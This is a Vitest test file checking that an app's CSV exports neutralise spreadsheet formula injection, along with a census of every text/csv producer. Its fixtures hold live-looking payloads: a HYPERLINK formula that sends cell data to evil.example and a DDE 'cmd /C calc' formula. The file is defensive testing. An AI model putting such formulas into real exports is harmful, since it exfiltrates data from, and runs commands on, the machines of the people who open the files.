// projects Round G (J11) — projects-and-cost PM-15: every CSV producer in the
// repo encodes its cells through lib/csvSafe (PM-10's one encoder), so a
// value led by = + - @ TAB CR is written as text, never a live formula.
//
// Two halves: (1) behaviour — each lib-level builder, fed a formula-leading
// value, writes it apostrophe-prefixed and quoted; (2) a census — any file
// under app/, lib/ or components/ that hands a browser `text/csv` must import
// lib/csvSafe or call a named builder whose module does, and no file but
// lib/csvSafe.ts hand-rolls the CSV quote-doubling idiom.

import { describe, it, expect, vi } from "vitest";
import { readFileSync, readdirSync, statSync } from "node:fs";
import { join } from "node:path";

vi.mock("@/lib/supabase", () => ({ supabase: {} }));
vi.mock("@/lib/inAppNotifications", () => ({ notify: vi.fn() }));
vi.mock("@/lib/audit", () => ({ logAuditAction: vi.fn() }));

import { registerToCsv, type RegisterRow } from "@/lib/docControlRegister";
import { ownershipRegisterToCsv } from "@/lib/ownership";
import { equipmentRegisterCsv } from "@/lib/drawingText";
import { reportToCsv } from "@/lib/notes";

const root = process.cwd();
const read = (f: string) => readFileSync(join(root, f), "utf8");
const EVIL = `=HYPERLINK("https://evil.example/?d="&A2,"Open")`;
const NEUTRALISED = `"'=HYPERLINK(""https://evil.example/?d=""&A2,""Open"")"`;

describe("PM-15 — each builder writes a formula-leading cell as text", () => {
  it("the document-control register (registerToCsv)", () => {
    const row = {
      id: "d1", number: "+P-100", title: EVIL, libraryId: "l1", libraryName: "@Lib", status: "Issued", rev: "-1",
      updatedAt: null, ownerName: "=owner", ownerUserId: "u1", owned: true, nextReviewDate: null,
      reviewStatus: "none", reviewDaysLeft: null, ack: null, ackStatus: "none", distributionAcksOutstanding: 0,
      review: null, effectiveDate: null, effectivePending: false, retentionUntil: null, legalHold: false,
      dispositionEligible: false, external: false, originLabel: "Internal",
    } as unknown as RegisterRow;
    const line = registerToCsv([row]).split("\n")[1];
    expect(line.startsWith(`"'+P-100",${NEUTRALISED},"'@Lib","'-1",Issued,"'=owner",`)).toBe(true);
  });

  it("the ownership register (ownershipRegisterToCsv)", () => {
    const csv = ownershipRegisterToCsv([
      { nodeType: "document", name: EVIL, documentNumber: "-7", libraryName: "L", ownerUserId: "u1", ownerName: "@bob", source: "document" },
    ]);
    expect(csv.split("\n")[1]).toBe(`document,${NEUTRALISED},"'-7",L,"'@bob",document`);
  });

  it("the drawing equipment register (equipmentRegisterCsv — /api/knowledge/drawing's export)", () => {
    const csv = equipmentRegisterCsv([{ tag: "V-1", documentName: "=cmd|' /C calc'!A0", page: 2 }]);
    expect(csv.split("\r\n")[1]).toBe(`V-1,Vessels / Drums,1,"'=cmd|' /C calc'!A0",2`);
  });

  it("the notes report (reportToCsv) — the producer the finding's census missed", () => {
    const csv = reportToCsv({
      achievements: [], carryOver: [], activity: [],
      roadblocks: [{ text: "@SUM(1+1)", reason: "-2+3", topic: "+t" }],
      todayIso: "2026-10-01",
    } as unknown as Parameters<typeof reportToCsv>[0]);
    expect(csv.split("\n")[1]).toBe(`Roadblock,2026-10-01,"'@SUM(1+1)","'-2+3",,"'+t"`);
  });
});

function walk(dir: string): string[] {
  return readdirSync(dir).flatMap((f) => {
    const p = join(dir, f);
    if (statSync(p).isDirectory()) return f === "__tests__" || f === "node_modules" ? [] : walk(p);
    return /\.tsx?$/.test(p) ? [p] : [];
  });
}
const SOURCES = ["app", "lib", "components"].flatMap((d) => walk(join(root, d))).map((f) => f.replace(root + "/", ""));
const importsCsvSafe = (src: string) => /from ["']@\/lib\/csvSafe["']/.test(src);

/** A producer that builds its CSV through a named builder in another module. */
const VIA_BUILDER: Record<string, { builder: string; module: string }> = {
  "app/(protected)/register/page.tsx": { builder: "registerToCsv", module: "lib/docControlRegister.ts" },
  "app/(protected)/admin/permissions/page.tsx": { builder: "ownershipRegisterToCsv", module: "lib/ownership.ts" },
  "app/api/knowledge/drawing/route.ts": { builder: "equipmentRegisterCsv", module: "lib/drawingText.ts" },
};

describe("PM-15 census — a new text/csv producer must use lib/csvSafe", () => {
  // A producer hands a browser `text/csv` (a Blob type or a response
  // header). An upload picker's `accept=` list or an extension → MIME map is
  // not one.
  const producers = SOURCES.filter((f) => read(f).split("\n").some((l) =>
    /text\/csv/.test(l) && !/accept=|\bcsv:\s*["']text\/csv/.test(l)));

  it("finds the seven known producers (and the project export)", () => {
    expect(producers.sort()).toEqual([
      "app/(protected)/admin/audit/page.tsx",
      "app/(protected)/admin/permissions/page.tsx",
      "app/(protected)/register/page.tsx",
      "app/(protected)/requests/page.tsx",
      "app/api/knowledge/drawing/route.ts",
      "components/cockpit/CommandDeck.tsx",
      "lib/projectExport.ts",
    ]);
  });

  it("each producer imports lib/csvSafe, or calls a builder whose module does", () => {
    const offenders: string[] = [];
    for (const f of producers) {
      const src = read(f);
      if (importsCsvSafe(src)) continue;
      const via = VIA_BUILDER[f];
      if (via && new RegExp(`\\b${via.builder}\\(`).test(src) && importsCsvSafe(read(via.module))
        && new RegExp(`export function ${via.builder}\\(`).test(read(via.module))) continue;
      offenders.push(f);
    }
    expect(offenders).toEqual([]);
  });

  it("no file but lib/csvSafe.ts hand-rolls a CSV cell encoder (the quote-doubling idiom)", () => {
    const idiom = /\.replace\(\/"\/g,\s*(['"])""\1\)/;
    const hits = SOURCES.filter((f) => f !== "lib/csvSafe.ts" && idiom.test(read(f)));
    expect(hits).toEqual([]);
  });

  it("the page-local exporters encode through csvCell / csvLine", () => {
    expect(read("app/(protected)/admin/audit/page.tsx")).toMatch(/const csvField = csvCell;/);
    expect(read("components/cockpit/CommandDeck.tsx")).toMatch(/const csvField = csvCell;/);
    expect(read("app/(protected)/requests/page.tsx")).toMatch(/\[csvLine\(headers\), \.\.\.rows\.map\(r => csvLine\(r\)\)\]/);
  });
});
